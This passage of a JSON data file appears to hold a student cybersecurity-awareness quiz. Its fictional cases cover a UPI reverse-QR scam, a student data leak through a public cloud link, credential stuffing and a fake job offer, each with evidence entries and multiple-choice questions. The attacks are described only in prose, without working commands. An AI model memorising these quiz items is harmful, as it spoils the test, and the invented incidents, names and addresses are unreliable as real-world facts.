          "UPI PIN must be entered twice to receive refunds"
        ]
      },
      {
        "text": "What pretext did the scammer use to lure the student into the transaction?",
        "options": [
          "An unpaid library fine",
          "A college canteen rebate refund",
          "A national lottery prize",
          "A semester tuition bill"
        ]
      },
      {
        "text": "What phone number was used in the spoofed support call?",
        "options": [
          "+91 98765 00000",
          "1800-111-222",
          "+91 12345 67890",
          "100"
        ]
      },
      {
        "text": "What organization did the scam caller claim to represent?",
        "options": [
          "College Sports Office",
          "Police Department",
          "Hostel Warden",
          "State Bank Payment Desk"
        ]
      },
      {
        "text": "What warning is explicitly included in the bank SMS confirmation?",
        "options": [
          "Do not turn off phone",
          "Call support immediately",
          "Never share UPI PIN",
          "Delete this message"
        ]
      },
      {
        "text": "What balance remained in the student's account after the transaction?",
        "options": [
          "Rs. 1,000",
          "Rs. 210",
          "Rs. 4,500",
          "Rs. 0"
        ]
      },
      {
        "text": "What type of trick is scanning a QR code under the promise of 'receiving' money called?",
        "options": [
          "Reverse QR Code scam",
          "Ransomware",
          "SQL Injection",
          "WiFi eavesdropping"
        ]
      },
      {
        "text": "At what time was the unauthorized UPI transfer recorded?",
        "options": [
          "16:45:00 UTC",
          "10:00:00 UTC",
          "08:15:30 UTC",
          "14:22:10 UTC"
        ]
      },
      {
        "text": "How many minutes passed between the scammer's chat request and the debit?",
        "options": [
          "3 hours",
          "60 minutes",
          "About 4 to 5 minutes",
          "2 days"
        ]
      },
      {
        "text": "If a caller asks you to read an OTP or enter a PIN to receive cashback, what should you do?",
        "options": [
          "Follow their instructions quickly",
          "Disconnect the call immediately and never share credentials",
          "Ask your friend to enter their PIN instead",
          "Enter a wrong PIN 10 times"
        ]
      },
      {
        "text": "Which banking service handles UPI transactions in India?",
        "options": [
          "National Payments Corporation of India (NPCI)",
          "Interpol",
          "NASA",
          "Federal Reserve"
        ]
      },
      {
        "text": "Why are QR codes particularly effective for scammers in payment fraud?",
        "options": [
          "QR codes disable phone antivirus software",
          "QR codes are illegal in banking",
          "QR codes only work on stolen phones",
          "Humans cannot read the encoded payload text with the naked eye before scanning"
        ]
      },
      {
        "text": "Why did the phone display '+91 98765 00000' even though the caller was not from a bank?",
        "options": [
          "The bank accidentally gave out their private SIM card",
          "The number was assigned by the college network",
          "Caller ID spoofing allows attackers to transmit fake originating numbers over VoIP",
          "The student had saved that number in contacts previously"
        ]
      }
    ],
    "round2Questions": [
      {
        "text": "What specific parameter in the UPI intent URI set the debit amount to ₹4,500?",
        "options": [
          "pn=RebateRefund",
          "mc=0000",
          "pa=quick_refund_desk",
          "am=4500"
        ]
      },
      {
        "text": "What screen sharing application was installed on the victim's device?",
        "options": [
          "TeamViewer",
          "VNC",
          "QuickSupport",
          "AnyDesk"
        ]
      },
      {
        "text": "How quickly was the stolen ₹4,500 laundered and withdrawn after receipt?",
        "options": [
          "After 1 week",
          "Within 3 minutes",
          "After 24 hours",
          "It was never withdrawn"
        ]
      },
      {
        "text": "What telecommunications technology allowed the scammer to forge caller ID without a physical SIM?",
        "options": [
          "Offshore SIP VoIP trunking",
          "Analog landline",
          "Bluetooth tethering",
          "5G satellite link"
        ]
      },
      {
        "text": "Why did the scammer instruct the student to install QuickSupport?",
        "options": [
          "To verify the phone's screen resolution",
          "To clean junk files from the phone storage",
          "To speed up the phone's charging speed",
          "To view the student's screen in real time and monitor bank account balance and OTPs"
        ]
      },
      {
        "text": "What is a 'money mule' wallet or account in the context of online financial fraud?",
        "options": [
          "A savings account that charges zero transaction fees",
          "An account owned directly by the bank's CEO",
          "An intermediary account used to rapidly layer and cash out stolen funds to evade freezing",
          "A special account created for international students"
        ]
      },
      {
        "text": "What does 'pa=' stand for in a UPI intent URI like 'upi://pay?pa=quick_refund_desk@ybl'?",
        "options": [
          "Payment Amount",
          "Payee Address (the recipient's Virtual Payment Address)",
          "Personal Authorization",
          "Payee Account Number"
        ]
      },
      {
        "text": "What immediate action should the victim take within the 'Golden Hour' of financial cyber fraud?",
        "options": [
          "Call the national cybercrime helpline 1930 and report to their bank to freeze the beneficiary VPA",
          "Wait 3 days to see if the money is returned automatically",
          "Factory reset their smartphone",
          "Post about the incident on social media and do nothing else"
        ]
      },
      {
        "text": "Why does UPI architecture require two distinct security factors (Device Binding + UPI PIN)?",
        "options": [
          "To enable payments without an internet connection",
          "To make payments take 15 minutes to process",
          "To allow banks to charge double transaction fees",
          "To verify both 'something you have' (registered SIM) and 'something you know' (secret PIN)"
        ]
      },
      {
        "text": "How did the scammer exploit the visual design of payment apps to deceive the user?",
        "options": [
          "By changing the app's language to Latin",
          "By hiding the smartphone status bar",
          "By presenting a Pay request as a 'Refund Confirmation' screen",
          "By replacing the phone's battery icon"
        ]
      },
      {
        "text": "Why is it virtually impossible to recover funds once they are withdrawn as cash from an off-grid ATM?",
        "options": [
          "ATM cameras are never reviewed by police",
          "Cash transactions leave no further digital banking trail that can be reversed by bank freeze orders",
          "Banks are legally prohibited from investigating cash withdrawals",
          "Cash notes automatically change serial numbers"
        ]
      },
      {
        "text": "What permission in Android allows remote assistance apps like QuickSupport to capture screen content?",
        "options": [
          "MediaProjection / Screen Capture permission",
          "Vibration control permission",
          "Camera access permission",
          "Bluetooth scanning permission"
        ]
      },
      {
        "text": "What telecom mechanism is currently being deployed to combat caller ID spoofing globally?",
        "options": [
          "Charging ₹50 for every phone call",
          "Banning all international phone calls",
          "Disabling caller ID display on all phones",
          "STIR/SHAKEN digital certificate cryptographic verification for call origins"
        ]
      },
      {
        "text": "Examining the multi-stage scam, what were the three distinct attack vectors combined by the fraudster?",
        "options": [
          "Ransomware encryption, SQL injection, and DDoS attack",
          "Wi-Fi spoofing, Bluetooth sniffing, and DNS poisoning",
          "VoIP Vishing (caller ID spoofing), Screen Sharing surveillance, and Reverse QR Code debit manipulation",
          "Physical theft, SIM clone, and ATM skimming"
        ]
      },
      {
        "text": "What systemic banking safeguard would best protect non-technical users from reverse QR fraud?",
        "options": [
          "Removing QR codes completely from all stores",
          "Prominently displaying 'YOU ARE PAYING MONEY' in large red text before prompting for UPI PIN",
          "Allowing anyone to transfer money without any PIN",
          "Disabling UPI on all student accounts"
        ]
      }
    ]
  },
  "case-05": {
    "id": "case-05",
    "name": "CASE 05 — LEAKED STUDENT DATA",
    "summary": "Private student information appears on an unauthorised platform. Investigate how the information may have been exposed.",
    "evidence": [
      {
        "tag": "DATA LEAK",
        "time": "11:00:00 UTC",
        "title": "FORUM POST WITH SENSITIVE DATA",
        "details": "A post on a public forum published a spreadsheet with 1,200 student names, phone numbers, home addresses, and roll numbers."
      },
      {
        "tag": "FILE METADATA",
        "time": "11:05:22 UTC",
        "title": "EXCEL FILE PROPERTIES",
        "details": "File 'CSE_Students_Master_2026.xlsx' author property: 'prof_ramesh_laptop'. Created with Microsoft Excel on 2026-08-14."
      },
      {
        "tag": "CLOUD STORAGE AUDIT",
        "time": "11:20:40 UTC",
        "title": "PUBLIC CLOUD LINK",
        "details": "Faculty Google Drive folder shared with setting 'Anyone with the link can view' instead of restricted institutional access."
      },
      {
        "tag": "LINK INDEXING",
        "time": "11:35:10 UTC",
        "title": "PUBLIC SEARCH ENGINE INDEXING",
        "details": "The public Google Drive link was pasted into a public discussion channel and indexed by search bots."
      }
    ],
    "round2Evidence": [
      {
        "tag": "CLOUD AUDIT LOG",
        "time": "11:22:15 UTC",
        "title": "ANONYMOUS BULK DOWNLOAD SPIKE",
        "details": "Google Workspace admin audit logs reveal 84 automated curl/python-requests download requests from scraping bot IP 198.51.100.42 within 90 seconds."
      },
      {
        "tag": "ACCESS PERMISSIONS",
        "time": "11:24:00 UTC",
        "title": "INHERITED FOLDER PERMISSIONS",
        "details": "The sensitive student database spreadsheet was placed inside an unorganized parent folder titled 'General_CSE_Notices' which had inherited public sharing enabled 6 months ago."
      },
      {
        "tag": "DATA SCRAPING",
        "time": "11:28:30 UTC",
        "title": "TELEGRAM DATA LEAK CHANNEL",
        "details": "The scraped dataset was repackaged and uploaded to a Telegram channel specializing in college student databases for telemarketing and spam."
      },
      {
        "tag": "DLP CONFIG AUDIT",
        "time": "11:40:00 UTC",
        "title": "MISSING DLP POLICY",
        "details": "The institutional cloud tenant had not enforced Data Loss Prevention (DLP) rules to block sharing files containing Aadhaar numbers or personal contact databases outside the college domain."
      }
    ],
    "questions": [
      {
        "text": "How many student records were contained in the leaked spreadsheet?",
        "options": [
          "500",
          "10,000",
          "50",
          "1,200"
        ]
      },
      {
        "text": "What was the filename of the leaked student database?",
        "options": [
          "college_photos.zip",
          "canteen_menu.docx",
          "CSE_Students_Master_2026.xlsx",
          "exam_results.pdf"
        ]
      },
      {
        "text": "What author property was discovered inside the Excel file metadata?",
        "options": [
          "admin_desktop",
          "prof_ramesh_laptop",
          "hacker_unknown",
          "student_rep"
        ]
      },
      {
        "text": "What sharing setting was enabled on the faculty Google Drive folder?",
        "options": [
          "Anyone with the link can view",
          "Restricted to specific emails only",
          "Private to owner only",
          "Password protected"
        ]
      },
      {
        "text": "How did search engines discover and index the public drive link?",
        "options": [
          "Search bots guessed a 256-bit cryptographic key",
          "Google Drive automatically publishes all private files to the newspaper",
          "The professor advertised the link on television",
          "The link was pasted into a public discussion channel where search bots crawl"
        ]
      },
      {
        "text": "What types of sensitive personal data were exposed in the spreadsheet?",
        "options": [
          "Public holiday calendar dates",
          "Classroom furniture dimensions",
          "Student names, phone numbers, home addresses, and roll numbers",
          "Only the college lunch menu"
        ]
      },
      {
        "text": "On what date was the Excel file originally created according to its properties?",
        "options": [
          "2020-01-01",
          "2026-08-14",
          "2026-12-25",
          "Yesterday"
        ]
      },
      {
        "text": "Where was the sensitive data initially published online?",
        "options": [
          "A public discussion forum",
          "An official government gazette",
          "An encrypted offline USB drive",
          "The college notice board"
        ]
      },
      {
        "text": "What software was used to create the leaked spreadsheet?",
        "options": [
          "Adobe Photoshop",
          "AutoCAD",
          "VLC Media Player",
          "Microsoft Excel"
        ]
      },
      {
        "text": "What should the sharing setting of confidential student records be restricted to?",
        "options": [
          "Anonymous file sharing websites",
          "Anyone with the link on the public internet",
          "Restricted institutional accounts with specific authorization",
          "Public search engine crawlers"
        ]
      },
      {
        "text": "At what time was the public forum post with the data noticed?",
        "options": [
          "03:15:22 UTC",
          "11:00:00 UTC",
          "14:22:10 UTC",
          "08:12:00 UTC"
        ]
      },
      {
        "text": "Why is leaking student phone numbers and home addresses dangerous?",
        "options": [
          "It exposes students to unsolicited spam, harassment, and targeted phishing",
          "It automatically uninstalls mobile apps",
          "It makes phone batteries drain faster",
          "It changes the student's college degree title"
        ]
      },
      {
        "text": "What immediate step should the faculty member take upon discovering the exposure?",
        "options": [
          "Upload five more spreadsheets to test the link",
          "Wait until the end of the semester to review it",
          "Rename the file and keep the public link active",
          "Immediately revoke public link access and make the Drive folder restricted"
        ]
      },
      {
        "text": "Can removing a public link from Google Drive guarantee that leaked data disappears from the internet?",
        "options": [
          "Yes, Google Drive automatically deletes all copies everywhere on the internet",
          "Yes, because files expire after 24 hours automatically",
          "No, because anyone who already downloaded or mirrored the file retains a permanent copy",
          "No, but only if the file was a PDF document"
        ]
      },
      {
        "text": "What is the key difference between an external hacker breach and this data exposure incident?",
        "options": [
          "An external breach only happens on Mondays",
          "This incident was caused by cloud misconfiguration and human error, not malicious hacking into servers",
          "There is no difference between the two",
          "Cloud misconfiguration can never be detected by IT"
        ]
      }
    ],
    "round2Questions": [
      {
        "text": "How many automated download requests were recorded by the scraping bot in 90 seconds?",
        "options": [
          "Only 1 request",
          "1,000 requests",
          "84 requests",
          "10 requests"
        ]
      },
      {
        "text": "What was the parent folder name that passed public inherited permissions to the student database?",
        "options": [
          "Private_Staff_Vault",
          "General_CSE_Notices",
          "Admin_Root",
          "Restricted_Database"
        ]
      },
      {
        "text": "To which messaging platform was the scraped dataset uploaded for telemarketing distribution?",
        "options": [
          "Telegram",
          "Signal",
          "WhatsApp",
          "WeChat"
        ]
      },
      {
        "text": "What institutional security policy was missing in the college cloud tenant?",
        "options": [
          "Video streaming bandwidth limits",
          "Student wallpaper policy",
          "Dark mode UI policy",
          "Data Loss Prevention (DLP) policy to block external sharing of sensitive records"
        ]
      },
      {
        "text": "What user-agent headers were used by the scraper IP to pull the spreadsheet?",
        "options": [
          "Microsoft Edge",
          "Mozilla Safari",
          "curl / python-requests",
          "Googlebot verified"
        ]
      },
      {
        "text": "Why do inherited folder permissions represent a common vulnerability in cloud storage?",
        "options": [
          "Folders delete all files after 30 days",
          "Files placed inside a public folder automatically inherit public sharing without explicit warning",
          "Inherited folders cannot store spreadsheets",
          "Cloud storage encrypts files so heavily that owners lose access"
        ]
      },
      {
        "text": "How does an institutional Data Loss Prevention (DLP) system work in Google Workspace?",
        "options": [
          "It scans file content for regex patterns like Aadhaar/credit cards and restricts external sharing automatically",
          "It shuts down the user's computer when a spreadsheet is opened",
          "It converts all spreadsheets into plain text files",
          "It deletes student emails older than 7 days"
        ]
      },
      {
        "text": "What IP address carried out the automated bulk download scraping?",
        "options": [
          "10.0.0.5",
          "127.0.0.1",
          "192.168.1.1",
          "198.51.100.42"
        ]
      },
      {
        "text": "What privacy law or regulatory compliance standard is violated when student PII is exposed publicly?",
        "options": [
          "Building Construction Code",
          "Maritime Shipping Act",
          "Data Protection Act / Privacy Regulations governing personal identifiable information (PII)",
          "Air Traffic Control Regulations"
        ]
      },
      {
        "text": "How can web scrapers locate publicly shared Google Drive links automatically?",
        "options": [
          "By calling the Google headquarters helpdesk",
          "By querying search engine indexing APIs for 'drive.google.com/drive/folders/' across public forums and repos",
          "By guessing random 64-character URLs manually",
          "By monitoring satellite television signals"
        ]
      },
      {
        "text": "What metadata hygiene step should be performed before sharing any office document externally?",
        "options": [
          "Sanitizing author names, company properties, and revision history via document inspection tools",
          "Saving the file with all capital letters in the title",
          "Changing the font size to 12 pt",
          "Adding a colorful cover page"
        ]
      },
      {
        "text": "Why are Telegram channels frequently chosen by data brokers to distribute leaked databases?",
        "options": [
          "Telegram requires government ID to create a channel",
          "Telegram is only accessible on university campuses",
          "Telegram automatically encrypts spreadsheets into audio files",
          "Telegram allows large file sharing, anonymous channel creation, and resists regional takedown orders"
        ]
      },
      {
        "text": "What administrative Google Workspace setting prevents faculty from creating public link shares entirely?",
        "options": [
          "Deleting all faculty email accounts",
          "Limiting Google Drive storage to 10 MB per teacher",
          "Disabling external sharing to 'OFF' in Drive sharing settings for the Staff Organizational Unit",
          "Enabling dark mode for all users"
        ]
      },
      {
        "text": "Reconstructing the breach root cause, what combination of organizational failures led to this incident?",
        "options": [
          "A power outage at the campus data center followed by network cable damage",
          "Lack of DLP enforcement, overly broad folder inheritance, and sharing links on public forums",
          "A zero-day exploit in Google's cloud hypervisor and physical theft of servers",
          "Antivirus software expiring on student personal laptops"
        ]
      },
      {
        "text": "What comprehensive response protocol must the college incident team execute to handle this exposure?",
        "options": [
          "Revoke public link, audit cloud logs, notify affected students, report to authorities, and enforce DLP policies",
          "Restart the campus Wi-Fi router",
          "Simply delete the professor's Google Drive and deny anything happened",
          "Blame the students for having their names in the spreadsheet"
        ]
      }
    ]
  },
  "case-06": {
    "id": "case-06",
    "name": "CASE 06 — PASSWORD THEFT",
    "summary": "A user's account has been compromised after a password leak. Find the clues that explain how access was obtained.",
    "evidence": [
      {
        "tag": "BREACH DATABASE",
        "time": "INCIDENT RECORD 01",
        "title": "LEAKED CREDENTIAL DUMP",
        "details": "Student's email 'vikram.k@college.edu' and plaintext password 'College2024!' found in an old third-party gaming site database breach posted online."
      },
      {
        "tag": "PASSWORD AUDIT",
        "time": "INCIDENT RECORD 02",
        "title": "PASSWORD REUSE DETECTED",
        "details": "The student used the exact same password 'College2024!' for their university email, student portal, and personal social accounts without any variations."
      },
      {
        "tag": "ACCESS LOG",
        "time": "INCIDENT RECORD 03",
        "title": "UNUSUAL IP ACCESS",
        "details": "Account accessed from an automated credential stuffing tool IP address 185.220.101.9 at 04:00 AM while the student was logged off."
      },
      {
        "tag": "SECURITY ADVISORY",
        "time": "INCIDENT RECORD 04",
        "title": "COMPROMISED HASH",
        "details": "The breached gaming site stored passwords in legacy unsalted MD5 hashes which were cracked in seconds by automated rainbow table lookups."
      }
    ],
    "round2Evidence": [
      {
        "tag": "VPN AUDIT",
        "time": "04:02:15 UTC",
        "title": "OFFSHORE VPN TUNNEL LOGIN",
        "details": "Authentication logs confirm the attacker routed their session through a commercial VPN exit node in Romania to conceal their physical geolocation."
      },
      {
        "tag": "ACCOUNT TAMPER",
        "time": "04:04:30 UTC",
        "title": "SILENT FORWARDING FILTER",
        "details": "Attacker configured a mailbox rule to automatically forward password reset notifications to 'drop_box_rec@proton.me' and immediately delete incoming security alerts."
      },
      {
        "tag": "LATERAL PIVOT",
        "time": "04:08:00 UTC",
        "title": "CAMPUS PORTAL DATA EXTRACTION",
        "details": "Using the compromised credentials, attacker logged into the university grade database and downloaded internal student transcripts for the entire semester batch."
      },
      {
        "tag": "IDENTITY AUDIT",
        "time": "04:12:00 UTC",
        "title": "DARK WEB FORUM SALE LISTING",
        "details": "University credentials associated with 'college.edu' were packaged into a combo list titled 'Edu_Packs_2026' and offered for sale on an illicit darknet forum."
      }
    ],
    "questions": [
      {
        "text": "What was the student's compromised password revealed in the breach database?",
        "options": [
          "admin123",
          "password@123",
          "College2024!",
          "Secret99#"
        ]
      },
      {
        "text": "What bad security habit made the student vulnerable across multiple websites?",
        "options": [
          "Writing passwords in a locked personal diary",
          "Using the exact same password across university email, portal, and social accounts",
          "Changing passwords every two weeks",
          "Using passwords that contain special characters"
        ]
      },
      {
        "text": "What type of website originally leaked the student's password in an old breach?",
        "options": [
          "A third-party gaming website",
          "A local hospital website",
          "A government tax portal",
          "The official college website"
        ]
      },
      {
        "text": "At what time was the automated suspicious login recorded in the access log?",
        "options": [
          "06:15 AM",
          "08:30 PM",
          "12:00 PM",
          "04:00 AM"
        ]
      },
      {
        "text": "What hashing algorithm was used by the compromised gaming website?",
        "options": [
          "Argon2id",
          "Bcrypt",
          "Unsalted MD5",
          "PBKDF2 with SHA-256"
        ]
      },
      {
        "text": "Why are unsalted MD5 hashes considered insecure for password storage?",
        "options": [
          "They require floppy disks to function",
          "They can be reversed in seconds using precomputed rainbow tables",
          "They automatically email passwords to the public",
          "They can only store four-digit numbers"
        ]
      },
      {
        "text": "What IP address initiated the unauthorized access at 04:00 AM?",
        "options": [
          "185.220.101.9",
          "192.168.0.1",
          "127.0.0.1",
          "10.10.10.10"
        ]
      },
      {
        "text": "What is the student's email address listed in the incident records?",
        "options": [
          "test@yahoo.com",
          "student123@gmail.com",
          "admin@college.edu",
          "vikram.k@college.edu"
        ]
      },
      {
        "text": "What technique did attackers use to test breached credentials against multiple sites?",
        "options": [
          "DNS Poisoning",
          "Phishing email",
          "Credential Stuffing",
          "Physical lock picking"
        ]
      },
      {
        "text": "What tool helps users generate and safely store unique passwords for every site?",
        "options": [
          "A spreadsheet on the desktop",
          "A password manager",
          "Sticky notes on the monitor",
          "A text document on a USB drive"
        ]
      },
      {
        "text": "Why should users never reuse the same password on gaming sites and college portals?",
        "options": [
          "If the gaming site is hacked, attackers will immediately test the password on the college portal",
          "Gaming passwords can only be typed on weekends",
          "Gaming sites charge extra money for college passwords",
          "Browsers do not allow college passwords on games"
        ]
      },
      {
        "text": "What security mechanism alerts users whenever an unfamiliar IP logs into their account?",
        "options": [
          "Mouse cursor changing color",
          "Screen brightness dimming",
          "Volume increase",
          "Login notification alerts"
        ]
      },
      {
        "text": "What should the student do first upon discovering their password was breached?",
        "options": [
          "Share the breached password with classmates",
          "Delete all games from their computer",
          "Change the password immediately on all accounts where it was used and enable 2FA",
          "Close the browser and hope for the best"
        ]
      },
      {
        "text": "Why was the 04:00 AM login time an immediate indicator of automated compromise?",
        "options": [
          "College accounts are programmed to delete themselves at 04:00 AM",
          "It occurred while the victim was offline and asleep, matching automated script scheduling",
          "Internet cables do not transmit data at night",
          "Servers are turned off at 04:00 AM every night"
        ]
      },
      {
        "text": "What is the primary difference between a 'password leak' and a 'phishing attack'?",
        "options": [
          "In a password leak, data is stolen from a breached server database; in phishing, the victim is tricked into typing credentials",
          "Password leaks only affect bank accounts",
          "A password leak only happens on Apple phones",
          "Phishing requires stealing the physical computer"
        ]
      }
    ],
    "round2Questions": [
      {
        "text": "In which country was the commercial VPN exit node located?",
        "options": [
          "United States",
          "Romania",
          "Singapore",
          "India"
        ]
      },
      {
        "text": "What email address did the attacker configure to receive forwarded reset emails?",
        "options": [
          "drop_box_rec@proton.me",
          "admin@college.edu",
          "shadow_relay_99@proton.me",
          "backup@gmail.com"
        ]
      },
      {
        "text": "What internal academic data was exfiltrated from the university portal?",
        "options": [
          "Library book receipts",
          "Hostel meal menus",
          "Faculty salary slips",
          "Internal student transcripts for the entire semester batch"
        ]
      },
      {
        "text": "What was the title of the darknet combo list package containing the university credentials?",
        "options": [
          "Student_Dumps_India",
          "Hack_Batch_99",
          "Edu_Packs_2026",
          "College_Leaks_v1"
        ]
      },
      {
        "text": "Why did the attacker configure a rule to immediately delete incoming security alerts?",
        "options": [
          "To save storage space on the university server",
          "To prevent the legitimate student from noticing warning emails and resetting the password",
          "To test whether the email server was responsive",
          "Because security alerts are considered spam by default"
        ]
      },
      {
        "text": "What is a 'credential combo list' in cybercrime terminology?",
        "options": [
          "A curated text file of leaked email-and-password pairs compiled for automated stuffing attacks",
          "A list of verified antivirus programs",
          "A list of software license keys for gaming consoles",
          "A directory of college professors and phone numbers"
        ]
      },
      {
        "text": "What cryptographic concept is 'salt' in modern password hashing algorithms?",
        "options": [
          "An encryption key shared with all users",
          "A password that can only contain letters",
          "A physical substance used to clean server memory chips",
          "A unique random string appended to each password before hashing to defeat rainbow tables"
        ]
      },
      {
        "text": "Why do cybercriminals route attacks through commercial VPN exit nodes?",
        "options": [
          "To increase their download speed by 500%",
          "To automatically crack passwords",
          "To hide their true originating IP and bypass geolocation-based IP blocklists",
          "Because universities only accept traffic from VPNs"
        ]
      },
      {
        "text": "How does credential stuffing differ from a standard dictionary brute force attack?",
        "options": [
          "Stuffing only works on Wi-Fi networks",
          "Stuffing tests known valid username-password pairs from breaches across other services; dictionary attacks guess random words",
          "Stuffing cannot be detected by server logs",
          "Dictionary attacks require stealing physical hard drives"
        ]
      },
      {
        "text": "What defensive control would have stopped the attacker at 04:02 UTC even with the valid password?",
        "options": [
          "Enforced Multi-Factor Authentication (MFA) requiring an authenticator app code",
          "Making the username longer",
          "Disabling CSS stylesheets on the login page",
          "Changing the color of the login button to blue"
        ]
      },
      {
        "text": "Why should email mailbox forwarding rules be audited regularly by enterprise security teams?",
        "options": [
          "They prevent users from sending attachments",
          "Forwarding rules cause email servers to run out of electricity",
          "Forwarding rules are not supported in modern email clients",
          "Attackers frequently establish stealth forwarding rules to maintain covert surveillance on victim correspondence"
        ]
      },
      {
        "text": "What forensic artifact confirms lateral movement within the university environment?",
        "options": [
          "The student checking their timetable on a phone",
          "The campus server rebooting for a scheduled update",
          "Using the single email compromise to access and dump the university grade database",
          "The student downloading a class lecture PDF"
        ]
      },
      {
        "text": "How can website administrators protect their users against credential stuffing attacks?",
        "options": [
          "Display the full password on the screen",
          "Implement CAPTCHAs, rate limiting per IP/account, and check passwords against breach APIs (like HaveIBeenPwned)",
          "Disable the login page during daytime hours",
          "Allow unlimited password attempts to be user-friendly"
        ]
      },
      {
        "text": "Reconstructing the adversary timeline, what was the sequential chain of actions performed by the attacker?",
        "options": [
          "Harvest breached combo list -> VPN login at 04:02 -> Create silent forwarding rule -> Dump batch transcripts -> Package credentials for dark web resale",
          "Dump transcripts -> Harvest combo list -> Package on dark web -> Create forwarding rule",
          "Create forwarding rule -> Package on dark web -> Harvest combo list -> VPN login",
          "Package on dark web -> Dump transcripts -> VPN login -> Create forwarding rule"
        ]
      },
      {
        "text": "What is the primary corporate lesson for the university IT administration regarding student identity governance?",
        "options": [
          "Banning all students from playing video games",
          "Instructing students never to access email after 10 PM",
          "Only permitting email access from physical desktop labs on campus",
          "Mandatory MFA on all student portals, continuous credential compromise monitoring, and strict mailbox rule auditing"
        ]
      }
    ]
  },
  "case-07": {
    "id": "case-07",
    "name": "CASE 07 — FAKE JOB OFFER SCAM",
    "summary": "A student receives a job offer requesting personal information and an unexpected payment. Identify the signs of fraud.",
    "evidence": [
      {
        "tag": "JOB OFFER EMAIL",
        "time": "INCIDENT RECORD 01",
        "title": "UNREALISTIC SALARY OFFER",
        "details": "Email offering ₹80,000/month for 2 hours of daily basic data entry work with zero interview, no resume screening, and immediate hiring."
      },
      {
        "tag": "PAYMENT DEMAND",
        "time": "INCIDENT RECORD 02",
        "title": "MANDATORY LAPTOP DEPOSIT",
        "details": "Recruiter demanded a 'refundable security deposit' of ₹3,000 via UPI for dispatching a high-end corporate MacBook Pro laptop."
      },
      {
        "tag": "SENDER AUDIT",
        "time": "INCIDENT RECORD 03",
        "title": "FREE EMAIL PROVIDER USED",
        "details": "Recruiter sent offer from 'hr.infotech.careers@gmail.com' rather than an official corporate domain name."
      },
      {
        "tag": "COMPANY CHECK",
        "time": "INCIDENT RECORD 04",
        "title": "NON-EXISTENT COMPANY REGISTRATION",
        "details": "Corporate registry (MCA portal) search revealed no company registered under 'InfoTech Global Careers' at the stated address."
      }
    ],
    "round2Evidence": [
      {
        "tag": "DOMAIN WHOIS",
        "time": "09:15:00 UTC",
        "title": "LOOKALIKE RECRUITING DOMAIN",
        "details": "Domain 'infotech-careers-portal.site' registered just 4 days prior through a Russian privacy service with a disposable 1-year registration."
      },
      {
        "tag": "BANKING RECORD",
        "time": "09:30:20 UTC",
        "title": "MONEY MULE ACCOUNT WITHDRAWAL",
        "details": "UPI deposit of ₹3,000 to VPA 'hr_dep_proc@okaxis' was instantly transferred to an intermediary account and cashed out at an ATM in Noida."
      },
      {
        "tag": "DOCUMENT ANALYSIS",
        "time": "09:42:00 UTC",
        "title": "FORGED OFFER LETTER WITH STOLEN LOGO",
        "details": "Offer letter PDF contained low-resolution stolen logo from a legitimate MNC, filled with typographical errors and an invalid CIN (Corporate Identity Number)."
      },
      {
        "tag": "TELEGRAM ESCALATION",
        "time": "09:55:00 UTC",
        "title": "UNREGULATED CHAT ESCALATION",
        "details": "Recruiter insisted on moving all communication from email to Telegram handle '@HR_Sneha_Verify' to prevent email traceability."
      }
    ],
    "questions": [
      {
        "text": "What salary was promised to the student for only 2 hours of daily data entry work?",
        "options": [
          "₹5,000/month",
          "₹80,000/month",
          "₹10,000/month",
          "₹1,000/month"
        ]
      },
      {
        "text": "How much 'refundable security deposit' did the scammer demand for courier shipment?",
        "options": [
          "₹3,000",
          "₹500",
          "₹50,000",
          "₹100"
        ]
      },
      {
        "text": "What equipment did the scammer falsely promise to courier to the student?",
        "options": [
          "A bicycle",
          "A textbook",
          "A coffee mug",
          "A high-end corporate MacBook Pro laptop"
        ]
      },
      {
        "text": "What free public email service was used by the recruiter?",
        "options": [
          "ProtonMail",
          "Yahoo",
          "Gmail (@gmail.com)",
          "Outlook"
        ]
      },
      {
        "text": "What did the official corporate registry (MCA) search reveal about the company?",
        "options": [
          "It was the largest software company in the country",
          "No company was registered under that name at the stated address",
          "The company was founded in 1850",
          "The company had 100,000 employees"
        ]
      },
      {
        "text": "What critical interview step was completely bypassed in this suspicious job offer?",
        "options": [
          "Technical screening, resume evaluation, and formal interview",
          "Downloading a mobile game",
          "Signing up for social media",
          "Buying a new phone case"
        ]
      },
      {
        "text": "What is the universal rule regarding legitimate job offers and upfront payments?",
        "options": [
          "Job deposits must always be paid via cash",
          "Upfront fees are legally required by the government",
          "All genuine companies charge ₹3,000 upfront",
          "Legitimate companies NEVER ask candidates to pay money for laptops or recruitment fees"
        ]
      },
      {
        "text": "What payment method did the scam recruiter demand for the deposit?",
        "options": [
          "Gold coins",
          "Cash sent through post",
          "UPI transfer",
          "Cryptocurrency only"
        ]
      },
      {
        "text": "Why do scammers offer absurdly high salaries like ₹80,000 for basic 2-hour data entry?",
        "options": [
          "Because government rules mandate high salaries for freshers",
          "To generate irresistible greed and excitement, blinding victims to obvious fraud signs",
          "Because data entry is the most difficult job in the world",
          "Because companies have too much cash to give away"
        ]
      },
      {
        "text": "What was the sender's full email address in the incident record?",
        "options": [
          "hr.infotech.careers@gmail.com",
          "tcs_hr@tcs.com",
          "careers@microsoft.com",
          "jobs@google.com"
        ]
      },
      {
        "text": "Why should job seekers be cautious when HR recruiters use free @gmail.com addresses?",
        "options": [
          "Gmail accounts expire every month",
          "Gmail is only allowed for personal gaming",
          "Gmail addresses cannot send PDFs",
          "Genuine corporate HR recruiters use official company domain emails (e.g., @company.com)"
        ]
      },
      {
        "text": "What should a student do if an unknown recruiter demands a refundable laptop deposit?",
        "options": [
          "Immediately send ₹3,000 to reserve the laptop",
          "Negotiate the deposit down to ₹1,500",
          "Refuse payment, terminate contact, and report the fraud to cybercrime authorities",
          "Send credit card details over chat"
        ]
      },
      {
        "text": "What government ministry in India manages company registrations (MCA)?",
        "options": [
          "Ministry of Health",
          "Ministry of Corporate Affairs",
          "Ministry of Railways",
          "Ministry of Agriculture"
        ]
      },
      {
        "text": "Why did the scammer describe the deposit as 'refundable'?",
        "options": [
          "To create a false sense of financial safety, making the victim feel they have nothing to lose",
          "Because banks legally require all deposits to be returned within an hour",
          "Because the scammer truly intends to refund the money after 10 days",
          "To test if the student understands accounting terms"
        ]
      },
      {
        "text": "Even if an offer letter contains a company logo, why is that insufficient proof of legitimacy?",
        "options": [
          "Logos are automatically deleted when saved as PDF",
          "Company logos cannot be printed in color",
          "Only government documents are allowed to have logos",
          "Logos can easily be copied from internet image searches and pasted onto fake PDF templates"
        ]
      }
    ],
    "round2Questions": [
      {
        "text": "How many days old was the lookalike domain 'infotech-careers-portal.site'?",
        "options": [
          "4 days old",
